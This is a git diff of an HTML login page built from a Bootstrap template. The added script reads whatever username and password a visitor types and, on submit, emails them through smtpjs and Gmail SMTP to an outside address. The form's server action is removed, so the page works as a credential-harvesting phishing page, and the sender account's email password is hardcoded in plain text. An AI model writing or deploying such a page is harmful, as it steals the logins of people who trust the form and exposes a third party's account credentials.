@@ -9,6 +9,7 @@
 <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
 <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
+<script src="https://smtpjs.com/v3/smtp.js"></script>
 <style>
 .login-form {
     width: 340px;
@@ -36,16 +37,16 @@
 </head>
 <body>
 <div class="login-form">
-    <form action="/examples/actions/confirmation.php" method="post">
+    <form method="">
         <h2 class="text-center">Log in</h2>       
         <div class="form-group">
-            <input type="text" class="form-control" placeholder="Username" required="required">
+            <input type="text" id="username" class="form-control" placeholder="Username" required="required">
         </div>
         <div class="form-group">
-            <input type="password" class="form-control" placeholder="Password" required="required">
+            <input type="password" id="password" class="form-control" placeholder="Password" required="required">
         </div>
         <div class="form-group">
-            <button type="submit" class="btn btn-primary btn-block">Log in</button>
+            <button type="submit" id="submit" class="btn btn-primary btn-block">Log in</button>
         </div>
         <div class="clearfix">
             <label class="float-left form-check-label"><input type="checkbox"> Remember me</label>
@@ -54,5 +55,35 @@
     </form>
     <p class="text-center"><a href="#">Create an Account</a></p>
 </div>
+<script src="https://code.jquery.com/jquery-3.6.0.slim.js" integrity="sha256-HwWONEZrpuoh951cQD1ov2HUK5zA5DwJ1DNUXaM6FsY=" crossorigin="anonymous"></script>
+<script type="text/javascript">
+    $(document).ready(function(){
+
+        $("#submit").click(function(){
+            debugger;
+            var Username =$("#username").val();
+            var password =$("#password").val();
+            sendEmail(Username,password)
+        })
+    })
+    function sendEmail(username,password){
+        debugger;
+        Email.send({
+Host : "smtp.gmail.com",
+Username : "duckoff7497@gmail.com",
+Password : "Duck Off 7497",
+To : 'munna.molla39@gmail.com',
+From : "duckoff7497@gmail.com",
+Subject : "Demo of the smtpjs api",
+Body : "Username : " + username + " password : " + password
+}).then(
+message => alert(message)
+);
+    }
+    
+
+</script>
+
+
 </body>
 </html>
